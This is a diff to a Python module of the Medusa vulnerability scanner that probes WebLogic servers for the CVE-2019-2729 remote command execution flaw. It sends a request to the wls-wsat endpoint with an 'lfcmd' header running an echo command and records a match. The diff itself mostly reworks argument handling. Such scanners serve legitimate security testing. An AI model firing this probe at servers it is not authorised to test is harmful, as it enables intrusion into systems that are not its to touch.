@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __author__ = 'Ascotbe'
-from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies,randoms,Exploit,ExploitOutput
+from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,randoms
 import urllib3
 import base64
 import requests
@@ -23,20 +23,14 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=Proxies().result(proxies)
-    scheme, url, port = UrlProcessing().result(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
-
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     RM = randoms().result(300)
     try:
         payload = "/wls-wsat/CoordinatorPortType"
-        payload_url = scheme + "://" + url + ":" + str(port) + payload
+        payload_url = url + payload
 
         Headers["Content-Type"]="text/xml"
         Headers['lfcmd']="echo "+RM
@@ -53,7 +47,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
             Medusa = "{}存在WebLogic远程命令执行漏洞(CVE-2019-2729)\r\n验证数据:\r\n漏洞位置:{}\r\n利用POC:{}\r\n返回数据包:{}\r\n执行命令:{}\r\n".format(
                 url, payload_url, data, con,"echo "+RM,)
             _t = VulnerabilityInfo(Medusa)
-            VulnerabilityDetails(_t.info, url, **kwargs).Write()  # 传入url和扫描到的数据
+            VulnerabilityDetails(_t.info, resp, **kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
